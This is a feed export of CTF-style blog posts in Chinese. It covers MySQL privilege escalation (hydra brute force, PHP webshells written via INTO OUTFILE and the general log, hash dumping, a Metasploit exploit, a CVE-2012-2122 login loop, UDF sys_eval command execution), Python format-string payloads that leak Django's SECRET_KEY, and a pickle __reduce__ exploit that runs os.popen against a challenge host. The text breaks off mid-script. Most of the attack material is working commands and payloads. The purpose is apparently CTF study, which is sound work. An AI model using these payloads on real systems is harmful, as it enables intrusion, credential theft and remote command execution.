    <content type="html"><![CDATA[<p>本文讲使用<strong>最高权限</strong>登录mysql终端后如何获取shell权限</p><h3 id="获取mysql的用户名和密码的方式"><a class="markdownIt-Anchor" href="#获取mysql的用户名和密码的方式"></a> 获取mysql的用户名和密码的方式</h3><ol><li><p>MySQL 3306 端口弱口令爆破</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">hydra -l 用户名 -P 密码字典 mysql:<span class="hljs-regexp">//</span>对方IP<br></code></pre></td></tr></table></figure></li><li><p>sqlmap 注入的 <code>--sql-shell</code> 模式</p></li><li><p>网站的数据库配置文件中拿到明文密码信息</p></li><li><p>CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限</p></li></ol><h3 id="获取webshell权限"><a class="markdownIt-Anchor" href="#获取webshell权限"></a> 获取webshell权限</h3><h4 id="into-oufile-写-shell"><a class="markdownIt-Anchor" href="#into-oufile-写-shell"></a> into oufile 写 shell</h4><p>前提：</p><ul><li>secure_file_priv 无限制（才能使用load_file）</li></ul><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="hljs-section">+------------------+-------+</span><br><span class="hljs-section">| Variable_name    | Value |</span><br><span class="hljs-section">+------------------+-------+</span><br><span class="hljs-section">| secure_file_priv |       |</span><br><span class="hljs-section">+------------------+-------+</span><br></code></pre></td></tr></table></figure><table><thead><tr><th><strong>Value</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>NULL</td><td>不允许导入或导出</td></tr><tr><td>/tmp</td><td>只允许在 /tmp 目录导入导出</td></tr><tr><td>空</td><td>不限制目录</td></tr></tbody></table><ul><li>只能网站文件的物理地址</li><li>网站路径下具有写权限</li></ul><p>利用：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; into outfile &#x27;/var/www/html/info.php&#x27;;</span><br><span class="language-xml">#sqlmap操作</span><br><span class="language-xml">sqlmap -u &quot;http://x.x.x.x/?id=x&quot; --file-write=&quot;shell.php&quot; --file-dest=&quot;/var/www/html/test/shell.php&quot; </span><br></code></pre></td></tr></table></figure><h4 id="日志文件写shell"><a class="markdownIt-Anchor" href="#日志文件写shell"></a> 日志文件写shell</h4><p>要求对网站目录具有写权限</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="hljs-section">+------------------+---------------------------+</span><br><span class="hljs-section">| Variable_name    | Value                     |</span><br><span class="hljs-section">+------------------+---------------------------+</span><br>| general<span class="hljs-emphasis">_log      | OFF                       |</span><br><span class="hljs-emphasis">| general_log_file | /var/lib/mysql/fru1ts.log |</span><br><span class="hljs-emphasis">+------------------+---------------------------+</span><br><span class="hljs-emphasis">general_</span>log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。<br><br># 更改日志文件位置<br>set global general<span class="hljs-emphasis">_log = &quot;ON&quot;;</span><br><span class="hljs-emphasis">set global general_log_</span>file=<span class="hljs-emphasis">&#x27;/var/www/html/info.php&#x27;</span>;<br><br># 往日志里面写入 payload<br>select <span class="hljs-emphasis">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;<br><br>访问就能够getshell<br></code></pre></td></tr></table></figure><p>一般成功率低，在linux系统权限限制比较严格，而且写入成功了，这个文件是mysql创建的，apache访问时会出现HTTP 500的状态码，在windows系统成功率会高一点。</p><h3 id="获取主机权限"><a class="markdownIt-Anchor" href="#获取主机权限"></a> 获取主机权限</h3><p>假设已经拥有mysql的最高权限</p><h4 id="hash-获取与解密"><a class="markdownIt-Anchor" href="#hash-获取与解密"></a> Hash 获取与解密</h4><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"># MySQL &lt;= 5.6 版本<br><span class="hljs-section">mysql&gt; select host, user, password from mysql.user;</span><br><span class="hljs-section">+-----------+------+-------------------------------------------+</span><br><span class="hljs-section">| host      | user | password                                  |</span><br><span class="hljs-section">+-----------+------+-------------------------------------------+</span><br>| localhost | root | <span class="hljs-strong">*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="hljs-strong">| 127.0.0.1 | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="hljs-strong">| ::1       | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="hljs-strong">| %         | root | *</span>81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |<br><span class="hljs-code">+-----------+</span>------<span class="hljs-code">+-------------------------------------------+</span><br><br># MySQL &gt;= 5.7 版本<br><span class="hljs-section">mysql &gt; select host,user,authentication_string from mysql.user;</span><br><span class="hljs-section">+-----------+---------------+-------------------------------------------+</span><br><span class="hljs-section">| host      | user          | authentication_string                     |</span><br><span class="hljs-section">+-----------+---------------+-------------------------------------------+</span><br>| localhost | root          | <span class="hljs-strong">*8232A1298A49F710DBEE0B330C42EEC825D4190A |</span><br><span class="hljs-strong">| localhost | mysql.session | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span><br><span class="hljs-strong">| localhost | mysql.sys     | *</span>THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |<br><span class="hljs-code">+-----------+</span>---------------<span class="hljs-code">+-------------------------------------------+</span><br></code></pre></td></tr></table></figure><p>用<a href="https://www.cmd5.com/">https://www.cmd5.com/</a> 破解一下，或者使用Hashcat 破解</p><h4 id="mysql-cve漏洞"><a class="markdownIt-Anchor" href="#mysql-cve漏洞"></a> mysql CVE漏洞</h4><p>可以借助MSF</p><h5 id="yassl-缓冲区溢出"><a class="markdownIt-Anchor" href="#yassl-缓冲区溢出"></a> yaSSL 缓冲区溢出</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msf6 &gt; use exploit<span class="hljs-regexp">/linux/my</span>sql/mysql_yassl_hello<br></code></pre></td></tr></table></figure><h5 id="cve-2012-2122"><a class="markdownIt-Anchor" href="#cve-2012-2122"></a> CVE-2012-2122</h5><p>知道用户名多次输入错误的密码会有几率可以直接成功登陆进数据库，可以循环 1000 次登陆数据库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">seq</span> 1 1000`; <span class="hljs-keyword">do</span> mysql -uroot -pwrong -h 127.0.0.1 -P3306 ; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h4 id="udf提权"><a class="markdownIt-Anchor" href="#udf提权"></a> UDF提权</h4><h5 id="寻找插件目录"><a class="markdownIt-Anchor" href="#寻找插件目录"></a> 寻找插件目录</h5><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%plugin%&#x27;</span>;<br></code></pre></td></tr></table></figure><h5 id="写入动态链接库"><a class="markdownIt-Anchor" href="#写入动态链接库"></a> 写入动态链接库</h5><p>SQL 注入且是高权限，plugin 目录可写且需要 secure_file_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有<strong>字节长度限制</strong>，所以往往 POST 注入才可以执行这种攻击</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">sqlmap -u <span class="hljs-string">&quot;http://localhost:30008/&quot;</span> --data<span class="hljs-operator">=</span><span class="hljs-string">&quot;id=1&quot;</span> --file-write<span class="hljs-operator">=</span><span class="hljs-string">&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot;</span> --file-dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span><br></code></pre></td></tr></table></figure><p>没有注入的话，可以通过select写入文件，不过要求<code>secure_file_priv</code>是空</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 解码十六进制再写入多此一举</span><br>SELECT unhex(&#x27;7f454c<span class="hljs-number">4602</span>...&#x27;) INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;<br></code></pre></td></tr></table></figure><p>十六进制的内容可以参考国光师傅的，<a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p><h5 id="创建自定义函数并调用命令"><a class="markdownIt-Anchor" href="#创建自定义函数并调用命令"></a> 创建自定义函数并调用命令</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> STRING SONAME <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func; #查看 mysql 函数里面是否新增了 sys_eval<br></code></pre></td></tr></table></figure><p>然后就可以命令执行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql &gt; select sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="udf-shell"><a class="markdownIt-Anchor" href="#udf-shell"></a> UDF shell</h4><h5 id="usfphp"><a class="markdownIt-Anchor" href="#usfphp"></a> USF.PHP</h5><p>假设目标 MySQL 在内网情况下，无法直连 MySQL 或者 MySQL 不允许外连，可以使用网页脚本</p><p><a href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">t00ls USF.PHP</a>一键操作</p><h5 id="navicat-mysql"><a class="markdownIt-Anchor" href="#navicat-mysql"></a> Navicat MySQL</h5><p>目标 MySQL 不允许外连，但是可以上传 PHP 脚本,这个时候可以使用 Navicat 自带的 tunnel 隧道脚本上传到目标网站上,</p><p><a href="https://sqlsec.lanzoux.com/ibpoGijd6bc">https://sqlsec.lanzoux.com/ibpoGijd6bc</a> 国光提供了官方脚本</p><p>启动ntunnel_mysql.php，连接本地数据库，然后Navicat 连接的时候设置HTTP通道</p><img src="/2024/02/05/mysql%E6%8F%90%E6%9D%83/1.png" class=""><p>然后主机地址填localhost即可</p><p>之后就可以进行UDF提权了</p><p><a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python格式化字符串漏洞</title>
    <link href="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h3 id="格式化字符串漏洞举例"><a class="markdownIt-Anchor" href="#格式化字符串漏洞举例"></a> 格式化字符串漏洞举例</h3><p><a href="https://zhuanlan.zhihu.com/p/57309024">https://zhuanlan.zhihu.com/p/57309024</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">config = &#123;<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>: <span class="hljs-string">&#x27;f0ma7_t3st&#x27;</span>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        self.name = name<br><br>user=User(<span class="hljs-string">&#x27;fru1ts&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello &#123;name&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name=user.__class__.__init__.__globals__))<br></code></pre></td></tr></table></figure><p>两种导致格式化字符串的形式</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-string">&quot;test %s&quot;</span> <span class="hljs-meta">%</span> <span class="hljs-comment">(&#x27;test&#x27;)</span><br><span class="hljs-string">&quot;test &#123;0&#125;&quot;</span>.format<span class="hljs-comment">(&#x27;test&#x27;)</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/hongriSec/CTF-Training/tree/master/2018/%E7%99%BE%E8%B6%8A%E6%9D%AF2018/Web">https://github.com/hongriSec/CTF-Training/tree/master/2018/百越杯2018/Web</a></p><ul><li><p>格式化字符串漏洞只有只读属性没有执行属性，可以利用格式化字符串中的“获取对象属性”、“获取数组数值”等方法来寻找、取得一些敏感信息。</p></li><li><p>format函数无法执行__subclasses__()这样的方法，直接把这种payload套进格式化字符串的利用中会报错type object ‘object’ has no attribute ‘<strong>subclasses</strong>()’</p></li></ul><h3 id="django下的格式化字符串漏洞"><a class="markdownIt-Anchor" href="#django下的格式化字符串漏洞"></a> Django下的格式化字符串漏洞</h3><p><a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</a></p><p><a href="https://www.toutiao.com/article/6798379120028811780/">https://www.toutiao.com/article/6798379120028811780/</a></p><p>p神给了两条payload</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&#123;user<span class="hljs-selector-class">.groups</span><span class="hljs-selector-class">.model</span>._meta<span class="hljs-selector-class">.app_config</span><span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.admin</span><span class="hljs-selector-class">.settings</span>.SECRET_KEY&#125;<br>&#123;user<span class="hljs-selector-class">.user_permissions</span><span class="hljs-selector-class">.model</span>._meta<span class="hljs-selector-class">.app_config</span><span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.admin</span><span class="hljs-selector-class">.settings</span>.SECRET_KEY&#125;<br></code></pre></td></tr></table></figure><p>但是如果<code>admin</code>，<code>config.</code>等被过滤了就不能了利用了，所以需要通过分析payload如何构成，才能使用其他类进行替换。</p><p>1.<code>user</code>是一个<code>AnonymousUser</code>类，通过在Django库中搜索找到<code>AnonymousUser</code>的定义</p><img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.jpg" class=""><p>2.<code>group</code>属性有两种获取方式<code>_group</code>，<code>group</code>（通过<code> @property</code>将方法转换为属性）</p><img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/2.jpg" class=""><p>3.<code>group</code>是一个<code>EmptyManager</code>对象，在库中搜索定义该类的文件，可以看到<code>model</code>属性，</p><img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/3.jpg" class=""><p><code>_groups = EmptyManager(Group)</code>所以<code>Group</code>就是对应的<code>model</code></p><p>4.跟进<code>Group</code>类的定义，其继承自<code>Model</code>，再跟进看到<code>Model</code>继承自<code>ModelBase</code></p><p>5.在库中搜索<code>ModelBase</code>找到定义的位置</p><img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/4.jpg" class=""><p>在121行可以看到该类的_meta属性是一个<code>Options</code>类实例化的对象</p><img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/5.jpg" class=""><p>6.跟进到<code>Options</code>,<code>app_config</code>的定义如下</p><img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/6.jpg" class=""><p>看到<code>app.app_configs</code>有6个可选的元素，也就是<code>app_config</code>可以用<code>app.app_configs[admin]</code> <code>app.app_configs[auth]</code> <code>app.app_configs[contenttypes]</code> <code>app.app_configs[sessions]</code> <code>app.app_configs[messages]</code> <code>app.app_configs[staticfiles]</code>替换</p><img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/7.jpg" class=""><p><code>app_config</code>等价于<code>apps.app_configs.get(self.app_label)</code>，其中128行有<code>self.apps = self.default_apps</code>,73行有<code>default_apps = apps</code>,跟进<code>apps</code>,发现是一个<code>Apps</code>的类。</p><p>7.在库中搜索<code>Apps</code>类的定义</p><img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/8.jpg" class=""><p>在97行有<code>self.app_configs[app_config.label] = app_config</code>,而91行有<code>app_config = AppConfig.create(entry)</code></p><p>8.跟进到<code>AppConfig</code>类，这个对象有一个<code>module</code>属性是python的一个模块即<code>module</code>。</p><img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/9.jpg" class=""><p>9.第6步用什么替换需要最后能够找到含有<code>from django.conf import settings</code>的文件（用于读配置信息）</p><p>例如：用<code>admin</code>,然后在<code>/django/contrib/admin</code>文件中查找<code>from django.conf import settings</code></p><img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/10.jpg" class=""><img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/11.jpg" class=""><p>找到的这里文件都是可以利用的</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&#123;user<span class="hljs-selector-class">.groups</span><span class="hljs-selector-class">.model</span>._meta<span class="hljs-selector-class">.apps</span><span class="hljs-selector-class">.app_configs</span><span class="hljs-selector-attr">[admin]</span><span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.checkers</span><span class="hljs-selector-class">.settings</span>.SECRET_KEY&#125;<br></code></pre></td></tr></table></figure><p><code>SECRET_KEY</code>可以更改为替他配置信息。</p><p>贴几个找好的payload</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&#123;user<span class="hljs-selector-class">.groups</span><span class="hljs-selector-class">.model</span>._meta<span class="hljs-selector-class">.apps</span><span class="hljs-selector-class">.app_configs</span><span class="hljs-selector-attr">[auth]</span><span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.checks</span><span class="hljs-selector-class">.settings</span>.CACHES&#125;<br>&#123;user<span class="hljs-selector-class">.groups</span><span class="hljs-selector-class">.model</span>._meta<span class="hljs-selector-class">.apps</span><span class="hljs-selector-class">.app_configs</span><span class="hljs-selector-attr">[auth]</span><span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.middleware</span><span class="hljs-selector-class">.settings</span>.CACHES&#125;<br>&#123;user<span class="hljs-selector-class">.groups</span><span class="hljs-selector-class">.model</span>._meta<span class="hljs-selector-class">.apps</span><span class="hljs-selector-class">.app_configs</span><span class="hljs-selector-attr">[sessions]</span><span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.middleware</span><span class="hljs-selector-class">.settings</span>.CACHES&#125;<br>&#123;user<span class="hljs-selector-class">.groups</span><span class="hljs-selector-class">.model</span>._meta<span class="hljs-selector-class">.apps</span><span class="hljs-selector-class">.app_configs</span><span class="hljs-selector-attr">[messages]</span><span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.middleware</span><span class="hljs-selector-class">.settings</span>.CACHES&#125;<br>&#123;user<span class="hljs-selector-class">.groups</span><span class="hljs-selector-class">.model</span>._meta<span class="hljs-selector-class">.apps</span><span class="hljs-selector-class">.app_configs</span><span class="hljs-selector-attr">[staticfiles]</span><span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.finders</span><span class="hljs-selector-class">.settings</span>.CACHES&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python反序列化</title>
    <link href="/2023/08/28/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/08/28/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="基础"><a class="markdownIt-Anchor" href="#基础"></a> 基础</h2><p>基于php反序列化的思路学习python反序列化。</p><p>Python 中最常用的序列化模块是 <code>pickle</code> 模块。</p><p>反序列化则使用pickle 模块的 <code>load()</code> 函数反序列化存储在文件中的 Python 对象。</p><h3 id="python序列化和反序列化例子"><a class="markdownIt-Anchor" href="#python序列化和反序列化例子"></a> Python序列化和反序列化例子</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#1.py</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.people = <span class="hljs-string">&#x27;lituer&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#2.py</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">import</span> test<br><br>a = test()<br>serialized = pickle.dumps(a) <span class="hljs-comment">#用python2执行脚本可以直接得到操作码</span><br><span class="hljs-built_in">print</span>(serialized)<br><span class="hljs-comment">#b&#x27;\x80\x03csecret\ntest\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00peopleq\x03X\x06\x00\x00\x00lituerq\x04sb.&#x27;</span><br>unserialized = pickle.loads(serialized)  <span class="hljs-comment"># 注意，loads 能够自动识别反序列化的版本</span><br><span class="hljs-built_in">print</span>(unserialized.people)<br><span class="hljs-comment">#lituer</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#序列化<br>pickle<span class="hljs-selector-class">.dump</span>(文件) <br>pickle<span class="hljs-selector-class">.dumps</span>(字符串)<br>#反序列化<br>pickle<span class="hljs-selector-class">.load</span>(文件) 、<span class="hljs-selector-id">#pickle</span><span class="hljs-selector-class">.load</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shell.pickle&#x27;</span>))<br>pickle<span class="hljs-selector-class">.loads</span>(字符串)<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">给同文件的类属性赋值<br><span class="hljs-string">b&#x27;&#x27;&#x27;(c__main__</span><br><span class="hljs-string">people</span><br><span class="hljs-string">S&#x27;a&#x27;</span><br><span class="hljs-string">S&#x27;man&#x27;</span><br><span class="hljs-string">S&#x27;1&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br><br>直接写值就行了<br></code></pre></td></tr></table></figure><h4 id="上传pkl文件进行dump"><a class="markdownIt-Anchor" href="#上传pkl文件进行dump"></a> 上传<code>.pkl</code>文件进行dump</h4><p>BuckeyeCTF 2023 <strong>Text Adventure API</strong>代码片断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;No file part&quot;</span>&#125;)<br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>    <span class="hljs-keyword">if</span> file <span class="hljs-keyword">and</span> file.filename.endswith(<span class="hljs-string">&#x27;.pkl&#x27;</span>):<br>        <span class="hljs-keyword">try</span>:<br>            loaded_session = pickle.load(file)<br>            session.update(loaded_session)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to load save game session.&quot;</span>&#125;)<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Game session loaded.&quot;</span>&#125;)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid file format. Please upload a .pkl file.&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p>这个地方要能够使pickle.load()解析正确做法: 要写一个类，不然会报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> pickle<br><br>url = <span class="hljs-string">&#x27;https://text-adventure-api.chall.pwnoh.io/api/load&#x27;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>): <span class="hljs-comment">#这个方法在序列化的时候会被调用</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&quot;</span>,))<br><br><br>q = exp()<br>data = 